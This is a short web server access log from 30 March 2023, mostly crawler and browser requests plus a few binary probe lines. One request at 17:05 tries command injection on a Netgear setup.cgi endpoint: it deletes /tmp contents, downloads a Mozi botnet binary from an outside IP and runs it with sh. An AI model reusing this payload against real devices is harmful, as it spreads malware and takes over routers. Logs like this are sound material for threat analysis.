43.158.213.246 - - [30/Mar/2023:16:49:39 +0000] "o\xFA\xC0\xBE\xB8\xC0\xA4\xC9\x89\xA2\xC2\x8F\x83\xAF\x91\x97\xBE\xCD\xB9\xCF\xAC\x9B\xB0\xAB\xA0\xB6\xB1\xAA\x9D\x9C\x9F\x96\x8D\x93\xCE\xB4\xB3\xB5\x98\xCD\xA6\xFA\xFA\xFA\xFA\x12\xFD\xD8\xF8\xFA\xFA\xC2\xFA\xFA\xFA\xFA\x1Af\xEC\xF9\xFA\xFA\xFA\xFA\xFB\xE5q\xF2\xFA\xFA\xFA\xFA\xFA\xFA\xF9wh\x97ui\xBA\xEA=E\xF0\x1B/\xA7XJ\xF11Y\x0B\xBF\xB1K\x1F\x00\xFA\xF8\xAF5Y\xDB\xA1\xA2 \xE00\xCC\xBAU]<\x15\x14\xBA\xC7W7c\x02\x98\xC996\x95\x1C\xC5\x164yR\xE7\x8C\x90\x8E\x06\x92w\xCD\xE9\x0E\x14!\x19\x87KE\xE1\x86 ,)\xEA\x85_\x16I(\x86\x8B?\xADXx\xD7\xE7\xB67\x83\xF1\xFC;\x83\xC8\x0F\xAE\xDD\x1A\xCA\xBF\xD3\xF0\x98\xAA\xD9=\xD0\xD0\xD6\xEF\xABQZ`\xBCrhc@[\x9Cz\xEA\x8AJ|\x8F\xEF\x86V\x11\xDC\xBB\x5C\xF8T\xF3=\x9B\xAF\x11\xBD8\x96\xAD\xE7e~`ov\xCC\xB6\xCA\xDE\xB78\xDC\xD88w9\x91\x8C\xD1\xDE/\x98\xCA\x8D%\xDC\x85+sb\xAE\xE5&\xCA\x08\x06\xFF\x9Ev\xA5\x96\xED\x0F\xBC\xEA2\xFA\x1F7\x03\xC9g\x83)TF$H\xA8\xD2\xA24\x91\x80\xABg\x0CF+\xBFx*w\x19\x01\x0E\xFF\xCF\x1B\xA8\x9AJrF.\x0B\x9D\x84\xF2\xEE\x80Y\x18\xD4\x12\xFE\x14\x89\x9B\x8C\x9AL6\x17\x09\xF25\x5C\xEDb\x02\x89\xCD\xA7|\xC9zL\x97\x81\x92\x96\xA3\xC4g\xB4(\xE3k\x82Gk\xC1\x90B\xE6][\xE1\x02\x9B\x86?Tua\x1C\xE0\xFC\x9F\x8D\xEB\x01\xAB\xC0\xE5\xD6\x98\xD5\xE0<\x93\xEA\x00\x8DT\xE9\x05\x04y-G\x0E\xC5R\x0E\x18\xF4\xC1\xD6\x8E\xBDi\xBBf\xBC1Z-\xFD\x90N\x16\x81\x07C*mk\x11\xBCZ\x02\x85\x95a\xDE\xAB\xA8\xB7\xA3\xA7;\x19\xDE\xB3\xD7" 400 157 "-" "-"
43.158.213.246 - - [30/Mar/2023:16:49:40 +0000] "\x02" 400 157 "-" "-"
43.158.213.246 - - [30/Mar/2023:16:49:45 +0000] "\x00\x00\x00" 400 157 "-" "-"
52.167.144.62 - - [30/Mar/2023:17:01:17 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
183.150.205.138 - - [30/Mar/2023:17:05:41 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://183.150.205.138:58916/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 0 "-" "-"
207.46.13.211 - - [30/Mar/2023:17:17:29 +0000] "GET / HTTP/1.1" 200 865 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
64.226.82.28 - - [30/Mar/2023:17:19:14 +0000] "GET / HTTP/1.1" 200 2236926 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
64.226.82.28 - - [30/Mar/2023:17:19:17 +0000] "GET / HTTP/1.1" 200 2499014 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
64.226.82.28 - - [30/Mar/2023:17:19:23 +0000] "GET /favicon.png HTTP/1.1" 200 17440 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
143.110.222.166 - - [30/Mar/2023:17:25:31 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
192.155.90.220 - - [30/Mar/2023:17:28:15 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.105.128.11 - - [30/Mar/2023:17:40:15 +0000] "GET / HTTP/1.1" 200 364614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
54.36.148.36 - - [30/Mar/2023:17:55:22 +0000] "GET /posts/pseudopost-8/pseudopost-8.html HTTP/1.1" 200 2850 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.175 - - [30/Mar/2023:17:55:24 +0000] "GET /posts/pseudopost-8/images/metro.jpeg HTTP/1.1" 200 450701 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.209 - - [30/Mar/2023:17:55:26 +0000] "GET /posts/pseudopost-8/images/min.jpeg HTTP/1.1" 200 570961 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
